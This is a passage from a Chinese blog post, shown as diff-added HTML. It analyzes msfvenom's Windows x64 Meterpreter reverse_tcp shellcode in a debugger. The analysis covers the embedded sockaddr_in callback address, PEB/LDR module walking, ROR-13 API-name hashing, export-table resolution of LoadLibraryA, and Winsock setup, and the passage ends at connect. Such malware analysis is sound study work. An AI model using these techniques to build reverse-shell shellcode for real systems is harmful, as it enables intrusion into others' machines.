+     <span class="token keyword">struct</span> <span class="token class-name">in_addr</span>   sin_addr<span class="token punctuation">;</span>      <span class="token comment">// 4 字节 ，32位IP地址</span>
+     <span class="token keyword">char</span>             sin_zero<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// 8 字节 ，不使用</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>内容</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sin_family</code></td>
+<td>0002</td>
+<td>地址族</td>
+</tr>
+<tr>
+<td><code>sin_port</code></td>
+<td>115ch（大端）</td>
+<td>端口号</td>
+</tr>
+<tr>
+<td><code>sin_addr</code></td>
+<td>C0 A8 EE 82（大端）</td>
+<td>ip 地址</td>
+</tr>
+</tbody></table>
+<p>最终，<code>r14</code> 存放 <code>ws2_32</code> dll 字符串指针，<code>r12</code> 存放 <code>sockaddr_in</code> 的结构体指针。</p>
+<h1 id="查找与调用函数"><a href="#查找与调用函数" class="headerlink" title="查找与调用函数"></a>查找与调用函数</h1><p><em>通过简单地计算哈希来查找函数。</em></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/10.png"><br>先将 <code>rcx</code> 设置为字符串地址，然后将 <code>r10d</code> 设置为一个完全看不懂的数值，<code>call rbp</code> 回到刚才设下的 shellcode 位置。<br>好像啥也看不懂。双击 <code>call</code> 看看做了什么。</p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/11.png"><br>先是 <code>push</code> 了一堆寄存器，可以猜测后面的操作会影响到这些寄存器的原有值。<br>中间还夹了一个非常经典的操作：<code>mov rdx, qword ptr gs:[rdx+60]</code>。这个指令正是从 teb 中获取 peb。</p>
+<blockquote>
+<p>teb：thread environment block，线程环境块（TEB 结构）可保存线程的上下文信息。详情见 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/debug/thread-environment-block--debugging-notes-">msdn</a>。在 windbg 中输入 <code>dt _TEB</code> 可以查看。<br>peb：process environment block，Contains process information.详情见 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">msdn</a>，在 windbg 中输入 <code>dt_PEB</code> 可以查看。<br>简单来说，通过这两个块可以获取到很多信息，最主要的就是，通过 PEB 可以获取到该进程中加载了的 dll 模块及其相关信息。</p>
+</blockquote>
+<p>这一部分主要就是将 <code>rdx</code> 设置为 peb 的地址。</p>
+<hr>
+<p><em>ldr。</em></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/12.png"><br>接下来开始解析 peb。</p>
+<p>首先给 <code>rdx+18h</code> 的位置解引用，这个位置存放了 ldr 的指针。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB</a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x380 bytes (sizeof)</span>
+<span class="token keyword">struct</span> <span class="token class-name">_PEB</span>
+<span class="token punctuation">&#123;</span>
+    UCHAR InheritedAddressSpace<span class="token punctuation">;</span>                                            <span class="token comment">//0x0</span>
+    UCHAR ReadImageFileExecOptions<span class="token punctuation">;</span>                                         <span class="token comment">//0x1</span>
+    UCHAR BeingDebugged<span class="token punctuation">;</span>                                                    <span class="token comment">//0x2</span>
+    <span class="token keyword">union</span>
+    <span class="token punctuation">&#123;</span>
+        UCHAR BitField<span class="token punctuation">;</span>                                                     <span class="token comment">//0x3</span>
+        <span class="token keyword">struct</span>
+        <span class="token punctuation">&#123;</span>
+            UCHAR ImageUsesLargePages<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                                    <span class="token comment">//0x3</span>
+            UCHAR IsProtectedProcess<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                                     <span class="token comment">//0x3</span>
+            UCHAR IsLegacyProcess<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                                        <span class="token comment">//0x3</span>
+            UCHAR IsImageDynamicallyRelocated<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                            <span class="token comment">//0x3</span>
+            UCHAR SkipPatchingUser32Forwarders<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                           <span class="token comment">//0x3</span>
+            UCHAR SpareBits<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">;</span>                                              <span class="token comment">//0x3</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    VOID<span class="token operator">*</span> Mutant<span class="token punctuation">;</span>                                                           <span class="token comment">//0x8</span>
+    VOID<span class="token operator">*</span> ImageBaseAddress<span class="token punctuation">;</span>                                                 <span class="token comment">//0x10</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_PEB_LDR_DATA</span><span class="token operator">*</span> Ldr<span class="token punctuation">;</span>                                              <span class="token comment">//0x18</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_RTL_USER_PROCESS_PARAMETERS</span><span class="token operator">*</span> ProcessParameters<span class="token punctuation">;</span>                 <span class="token comment">//0x20</span>
+<span class="token comment">// ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来继续解引用，<code>rdx+20h</code> 指向了一个结构体 <code>InMemoryOrderModuleList</code>。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB_LDR_DATA">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_PEB_LDR_DATA</a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x58 bytes (sizeof)</span>
+<span class="token keyword">struct</span> <span class="token class-name">_PEB_LDR_DATA</span>
+<span class="token punctuation">&#123;</span>
+    ULONG Length<span class="token punctuation">;</span>                                                           <span class="token comment">//0x0</span>
+    UCHAR Initialized<span class="token punctuation">;</span>                                                      <span class="token comment">//0x4</span>
+    VOID<span class="token operator">*</span> SsHandle<span class="token punctuation">;</span>                                                         <span class="token comment">//0x8</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InLoadOrderModuleList<span class="token punctuation">;</span>                               <span class="token comment">//0x10</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InMemoryOrderModuleList<span class="token punctuation">;</span>                             <span class="token comment">//0x20</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InInitializationOrderModuleList<span class="token punctuation">;</span>                     <span class="token comment">//0x30</span>
+    VOID<span class="token operator">*</span> EntryInProgress<span class="token punctuation">;</span>                                                  <span class="token comment">//0x40</span>
+    UCHAR ShutdownInProgress<span class="token punctuation">;</span>                                               <span class="token comment">//0x48</span>
+    VOID<span class="token operator">*</span> ShutdownThreadId<span class="token punctuation">;</span>                                                 <span class="token comment">//0x50</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果去查找 <code>_LIST_ENTRY</code> 这个结构体的话，会发现这个结构体完全和 <code>rdx+4ah</code> 搭不上边，因为这个结构体里面只有两个成员。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LIST_ENTRY">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LIST_ENTRY</a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x10 bytes (sizeof)</span>
+<span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span><span class="token operator">*</span> Flink<span class="token punctuation">;</span>                                              <span class="token comment">//0x0</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span><span class="token operator">*</span> Blink<span class="token punctuation">;</span>                                              <span class="token comment">//0x8</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其实，<code>InLoadOrderModuleList</code>、<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code> 这三个成员，本质上都是 <code>_LDR_DATA_TABLE_ENTRY</code> 结构体类型。（使用 <code>_LIST_ENTRY</code> 应该只是为了方便遍历？）<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LDR_DATA_TABLE_ENTRY">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_LDR_DATA_TABLE_ENTRY</a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0xe0 bytes (sizeof)</span>
+<span class="token keyword">struct</span> <span class="token class-name">_LDR_DATA_TABLE_ENTRY</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InLoadOrderLinks<span class="token punctuation">;</span>                                    <span class="token comment">//0x0</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InMemoryOrderLinks<span class="token punctuation">;</span>                                  <span class="token comment">//0x10</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> InInitializationOrderLinks<span class="token punctuation">;</span>                          <span class="token comment">//0x20</span>
+    VOID<span class="token operator">*</span> DllBase<span class="token punctuation">;</span>                                                          <span class="token comment">//0x30</span>
+    VOID<span class="token operator">*</span> EntryPoint<span class="token punctuation">;</span>                                                       <span class="token comment">//0x38</span>
+    ULONG SizeOfImage<span class="token punctuation">;</span>                                                      <span class="token comment">//0x40</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_UNICODE_STRING</span> FullDllName<span class="token punctuation">;</span>                                     <span class="token comment">//0x48</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_UNICODE_STRING</span> BaseDllName<span class="token punctuation">;</span>                                     <span class="token comment">//0x58</span>
+    ULONG Flags<span class="token punctuation">;</span>                                                            <span class="token comment">//0x68</span>
+    USHORT LoadCount<span class="token punctuation">;</span>                                                       <span class="token comment">//0x6c</span>
+<span class="token comment">// ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来我们就可以解析 <code>rdx+4ah</code> 是什么了？还不行。<br>这里有一个非常大的前提条件，就是前面提到的 <code>InLoadOrderModuleList</code>、<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code> 这三个成员，它们分别对应到 <code>_LDR_DATA_TABLE_ENTRY</code> 结构体对应成员的位置，即</p>
+<ul>
+<li><code>InLoadOrderModuleList</code> 会指向 <code>InLoadOrderLinks</code>（距 <code>_LDR_DATA_TABLE_ENTRY</code> 0 偏移）的位置，而</li>
+<li><code>InMemoryOrderModuleList</code> 会指向 <code>InMemoryOrderLinks</code>（距 <code>_LDR_DATA_TABLE_ENTRY</code> 0x10 偏移）的位置</li>
+<li><code>InInitializationOrderModuleList</code> 会指向 <code>InInitializationOrderLinks</code>（距 <code>_LDR_DATA_TABLE_ENTRY</code> 0x20 偏移）的位置</li>
+</ul>
+<p>也就是说，<code>rdx+4ah</code>，通过前面的 <code>InMemoryOrderModuleList</code> 0x10 偏移之后，对应的应该是结构体 0x5a 的位置，在 <code>BaseDllName</code> 里面，而不是 <code>FullDllName</code>（前者 <code>Base</code> 是只记录 dll 文件名称，而后者 <code>Full</code> 除了记录 dll 名称之外还会记录其所在路径）。<br><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_UNICODE_STRING">https://www.vergiliusproject.com/kernels/x64/windows-7/sp1/_UNICODE_STRING</a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x10 bytes (sizeof)</span>
+<span class="token keyword">struct</span> <span class="token class-name">_UNICODE_STRING</span>
+<span class="token punctuation">&#123;</span>
+    USHORT Length<span class="token punctuation">;</span>                                                          <span class="token comment">//0x0</span>
+    USHORT MaximumLength<span class="token punctuation">;</span>                                                   <span class="token comment">//0x2</span>
+    USHORT<span class="token operator">*</span> Buffer<span class="token punctuation">;</span>                                                         <span class="token comment">//0x8</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最终，<code>rcx</code> 存放被遍历的 dll 的 <code>BaseDllName</code> 中 <code>MaximumLength</code> 的值，<code>rsi</code> 存放 <code>BaseDllName</code> 中的 <code>Buffer</code>，即 dll 名称字符串。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/13.png"></p>
+<hr>
+<p><em>计算 dll 文件名的哈希。</em></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/14.png"></p>
+<p><code>xor rax, rax</code> 清空不多说。<br><code>lodsb</code> 是一个指令，会从 <code>ds:si</code>（<code>ds:rsi</code>） 中加载一个字节到 <code>al</code>，与其对应的还有 <code>lodsw</code>，加载一个字（2 个字节）到 <code>ax</code>。并且还会判断 <code>df</code> 标志位，如果 <code>df=0</code> 那么每加载一个字节就令 <code>si</code> +1，这也就是为什么最开始需要 <code>cld</code> 令 <code>df=0</code>。</p>
+<p><code>cmp al, 61</code>、<code>jl 0x2</code>、<code>sub al, 20</code> 这三者构成了最简单的小写转大写功能。首先判断字符是否是大写，<code>0x61</code> 对应的是小写的 <code>a</code>。<br><code>jl 0x2</code> 小于跳转，根据上面的跳转规则来看此处偏移总共是 4，即跳到 <code>35a7</code> 的位置。<br><code>sub al, 20</code> 将小写转大写，例如 <code>61h - 20h = 41h</code> 对应大写的 <code>A</code>。<br>其实说“小写转大写”也不太恰当，因为 ascii 表里面小写字母后面还有其他可见字符。此处估计没有考虑这么多。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/15.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/16.png"></p>
+<p><code>ror r9d, D</code> 将 <code>r9d</code> 循环右移 13 位。然后 <code>add r9d, eax</code> 将刚才加载的字符（经过变换后）存到 <code>r9d</code> 寄存器。<br>最后 <code>loop 0xed</code>，是什么意思呢？</p>
+<pre class="line-numbers language-none"><code class="language-none">E2 cb LOOP rel8   Decrement count; jump short if count !&#x3D; 0。 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即，一个循环。使用的寄存器是 <code>ecx</code>，正好对应前面提取 <code>MaximumLength</code> 即 dll 文件名字符串的长度。<br>这里的 <code>rel8</code> 是有符号数，<code>0xed</code> 即十进制下的 -19。<br>回顾前面提到的跳转偏移计算规则，计算地址的距离 <code>35ae + 指令长度 2 - 359d = 0x13 = 19</code>，二者正好对应，于是跳回到 <code>xor rax, rax</code> 准备清空字符，并令 <code>ecx</code> 计数器 -1。非常巧妙。</p>
+<p>最终 <code>r9d</code> 存放了 BaseDllName 的一串小哈希。</p>
+<hr>
+<p><em>检查导出表。</em></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/17.png"></p>
+<p>将当前 dll &#x2F; <code>_LDR_DATA_TABLE_ENTRY</code> 指针压到栈上存下来，以及对应的 dll hash 也留到栈上。</p>
+<p>回顾先前的内容，<code>rdx+20</code> 在这里应该是 <code>rdx+30</code>，对应了 <code>_LDR_DATA_TABLE_ENTRY</code> 的 <code>DllBase</code> 成员，这个指针指向了一块区域，这块区域存放着对应 pe 文件在硬盘上原有的样子（即，pe 结构以文件形式存放在硬盘上，与被加载到内存中，是两种不同的情况，这里 <code>DllBase</code> 指的是前者）。<br>随后 <code>rdx+3c</code>，熟悉 pe 结构的话就能知道，这里是 pe 结构里面的 <code>e_lfanew</code>，对应文件中 <code>_IMAGE_NT_HEADERS</code> 的偏移。<br>通过 <code>rax + rdx</code> 就可以得到 <code>_IMAGE_NT_HEADERS</code>。<br>接下来 <code>rax+18h</code> 读取 pe 位数，如果不是 64 位的话就跳出去了。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>
+ DWORD Signature<span class="token punctuation">;</span> <span class="token comment">// PE标识  0</span>
+ IMAGE_FILE_HEADER FileHeader<span class="token punctuation">;</span> <span class="token comment">// 标准PE头  4</span>
+ IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span> <span class="token comment">// 扩展PE头  18h</span>
+<span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span>
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>
+ WORD Machine<span class="token punctuation">;</span> <span class="token comment">// 可以运行在什么样的CPU上  4h</span>
+ WORD NumberOfSections<span class="token punctuation">;</span> <span class="token comment">// 表示节的数量  6h</span>
+ DWORD TimeDateStamp<span class="token punctuation">;</span> <span class="token comment">// 编译器填写的时间戳  8</span>
+ DWORD PointerToSymbolTable<span class="token punctuation">;</span> <span class="token comment">// 调试相关  0ch</span>
+ DWORD NumberOfSymbols<span class="token punctuation">;</span> <span class="token comment">// 调试相关  10h</span>
+ WORD SizeOfOptionalHeader<span class="token punctuation">;</span> <span class="token comment">// 扩展PE头的大小  14h</span>
+ WORD Characteristics<span class="token punctuation">;</span> <span class="token comment">// 文件属性  16h</span>
+<span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后 <code>rax+88</code> 获取导出表 rva，如果导出表是空的话也是直接跳出去了。</p>
+<p>两个 <code>jcc</code> 计算规则和上面一样，这里就不多说了。<br>跳转的位置如下。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/18.png"><br>把刚才 <code>push</code> 进来的两项内容 <code>pop</code> 回去，然后通过解析 <code>[rdx]</code> 继续转到下一个 <code>_LDR_DATA_TABLE_ENTRY</code> &#x2F; dll &#x2F; pe，并回到一开始获取 <code>BaseDllName</code> 的位置（<code>movzx rcx,word ptr ds:[rdx+4A]</code>）。</p>
+<p>总的来说，就是检查了 pe &#x2F; dll 的位数以及导出表情况，通过这两种方式提前排除掉不匹配的 dll。</p>
+<hr>
+<p><em>解析导出表，找到指定的函数。</em></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/19.png"></p>
+<p>在检查完导出表 rva 不为 0 之后，就跳转到导出表的对应位置。<br>其中 <code>rax+20</code>、<code>rax+18</code> 均与下面这个结构体有关，这两者解析了导出表中的 <code>AddressOfNames</code> 和 <code>NumberOfNames</code> 这两个字段，用于查找导出表中的函数名称。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_EXPORT_DIRECTORY</span> <span class="token punctuation">&#123;</span>
+    DWORD   Characteristics<span class="token punctuation">;</span> <span class="token number">0</span>
+    DWORD   TimeDateStamp<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">4</span>
+    WORD    MajorVersion<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">8</span>
+    WORD    MinorVersion<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">0</span>Ah
+    DWORD   Name<span class="token punctuation">;</span>　<span class="token operator">+</span><span class="token number">0</span>Ch
+    DWORD   Base<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">10</span>h
+    DWORD   NumberOfFunctions<span class="token punctuation">;</span>  <span class="token operator">+</span><span class="token number">14</span>h
+    DWORD   NumberOfNames<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">18</span>h
+    DWORD   AddressOfFunctions<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">1</span>ch
+    DWORD   AddressOfNames<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">20</span>h
+    DWORD   AddressOfNameOrdinals<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token number">24</span>h
+<span class="token punctuation">&#125;</span> IMAGE_EXPORT_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最终 <code>r8d</code> 存放 <code>AddressOfNames</code> 指针，<code>ecx</code> 存放函数名个数。</p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/20.png"></p>
+<p>清空 <code>r9</code> 寄存器用于存放哈希结果。<code>rcx</code> -1 用于计数（<code>NumberOfNames</code> 记录了有多少个函数名称，该值 -1 正好是指向最后一个函数名）。<br><code>[r8+rcx*4]</code> 解析每一个函数名 rva，与存放 DllBase 的 <code>rdx</code> 进行相加，就可以跳转到对应函数名的位置。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/21.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/22.png"></p>
+<p>清空 <code>rax</code> 用于给 <code>lodsb</code> 加载字符。<code>ror r9d, D</code> 和之前一样计算哈希。</p>
+<p><code>cmp al, ah</code> 是什么意思呢？<code>lodsb</code> 会从 <code>ds:si</code> 加载一个字节到 <code>al</code>，而 <code>xor rax, rax</code> 会清空整个 <code>ax</code>，所以说 <code>ah</code> 寄存器在这一块永远都是 0，即，用一种巧妙的方式判断 <code>al</code> 是否为空字符。<br>最后 <code>jne</code> 回到 <code>xor rax, rax</code>，继续下一个字符的计算。</p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/23.png"><br><code>[rsp+8]</code> 对应了先前的 <code>push r9</code> dll hash，即，将本次计算函数的 hash 和 dll hash 相加，然后比较 <code>r10d</code>，这也就解释了为什么之前 <code>call rbp</code> 的时候需要先令 <code>r10d</code> 为一个看不懂的值。<br><code>jne</code> 跳回到 <code>jrcxz</code> 的位置，比较是否已经遍历完该 dll 下所有带名字的导出函数。<br>如果 <code>jrcxz</code> 判断到 <code>rcx=0</code> 的话，就表明没有在该 dll 中找到对应的函数，继续下一个 dll 的查找。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/24.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/25.png"><br>如果上面 <code>jne</code> 没有跳出来，即 <code>r9d</code> 计算得到的哈希与 <code>r10d</code> 目标一致，表示已经找到了所需要的函数，这时候就会进行 <code>AddressOfNameOrdinals</code> 和 <code>AddressOfFunctions</code> 的查找，通过索引反推函数 rva 索引，最后将 rva 同 dll 地址相加，得到最终的函数地址。（回顾上面的 <code>_IMAGE_EXPORT_DIRECTORY</code> 结构体）</p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/26.png"><br>接下来是一系列的恢复栈指令，以及向目标函数准备传参（x64 规则）。<br>观察寄存器情况可以知道，这次要 <code>call</code> 的函数是 kernel32 的 <code>LoadLibraryA</code>，传入的参数是 <code>ws2_32</code>，加载一个用于网络通信的 dll。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/27.png"></p>
+<p>于是就可以得知，传入 <code>r10d</code> 的哈希：<code>0x726774C</code>，对应的是 <code>kernel32.LoadLibraryA</code>。</p>
+<p>此时还有一个问题没有回答，就是如何返回到 <code>call rbp</code> 的下一条指令？<br>如果执行到 <code>LoadLibraryA</code> 的 <code>ret</code>：<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/28.png"></p>
+<p>观察 <code>rsp</code>，会发现此时的地址正好是 <code>call rbp</code> 的下一条指令的位置。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/29.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/30.png"></p>
+<p>以上，完美实现了通过 ldr 链表查找 dll、查找对应函数、传参并调用函数三个功能。</p>
+<h1 id="继续建立通信"><a href="#继续建立通信" class="headerlink" title="继续建立通信"></a>继续建立通信</h1><p>分析完上述解析 ldr 之后，接下来的很多地方都是大同小异得了。<br>例如：<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/31.png"><br>在刚才 <code>jmp rax</code> 的位置下一个断点就可以看到调用情况。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/32.png"><br><code>WSAStartup</code> 函数的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winsock2/nf-winsock2-wsastartup">定义</a>如下。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> WSAAPI <span class="token function">WSAStartup</span><span class="token punctuation">(</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>  WORD      wVersionRequested<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>out<span class="token punctuation">]</span> LPWSADATA lpWSAData
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/33.png"><br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/34.png"><br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/35.png"><br><code>WSASocketA</code> 的函数<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winsock2/nf-winsock2-wsasocketa">定义</a>如下。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">SOCKET WSAAPI <span class="token function">WSASocketA</span><span class="token punctuation">(</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span>                 af<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span>                 type<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span>                 protocol<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> LPWSAPROTOCOL_INFOA lpProtocolInfo<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> GROUP               g<span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD               dwFlags
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/36.png"><br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/37.png"><br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/38.png"><br><code>connect</code> 函数的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winsock2/nf-winsock2-connect">定义</a>如下</p>
